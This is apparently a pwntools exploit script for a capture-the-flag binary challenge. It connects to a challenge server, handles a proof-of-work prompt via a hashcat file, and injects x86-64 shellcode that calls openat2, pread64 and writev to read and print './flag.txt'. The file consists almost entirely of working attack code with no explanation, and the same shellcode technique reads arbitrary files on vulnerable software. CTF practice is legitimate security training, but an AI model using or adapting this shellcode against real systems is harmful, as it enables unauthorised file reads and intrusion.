#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1643

        c
        ''')
        input()


if args.REMOTE:
    p = remote('138.197.94.25', 10001)
else:
    p = process(exe.path)
GDB()
if args.REMOTE:
    file_path = '/mnt/d/hashcat-6.2.6/a.hash'
    file = open(file_path, "w")
    p.recvuntil(b'"')
    print("?a?a?a?a" + p.recvuntil(b'")').decode())

    p.recvuntil(b'== ')
    file.write(p.recvline(keepends=False).decode())
    file.close()
    sla(b'XXXX: ', input())
    
base = 0xc0de000
pa = asm(f"""
         // openat2
         mov rax, 0x1b5
         mov rdi, 0xffffff9c
         mov rsi, {base + 0x100}
         mov rdx, {base + 0x120}
         mov r10, 0x20
         syscall
         // pread64()
         mov rax, 0x11
         mov rdi, 3
         mov rsi, {base+0xa0+0x50} 
         mov rdx, 0x100
         mov r10, 0
         syscall
         
         // 
         mov rcx, {base+0xa0} 
         mov rax, {base+0xa0+0x50} 
         mov [rcx], rax
         mov rax, 0x100
         mov [rcx+8], rax
         mov rdi, 1
         mov rdx, 1
         mov rsi, rcx
         mov rax, {constants.SYS_writev}
         syscall
         
         
         
         
         """)
pa = pa.ljust(0x100, b'\0') + b'./flag.txt'
pa = pa.ljust(0x120, b'\0') + flat(0,0,0,0)
sa(b'anything:', pa)
p.interactive()
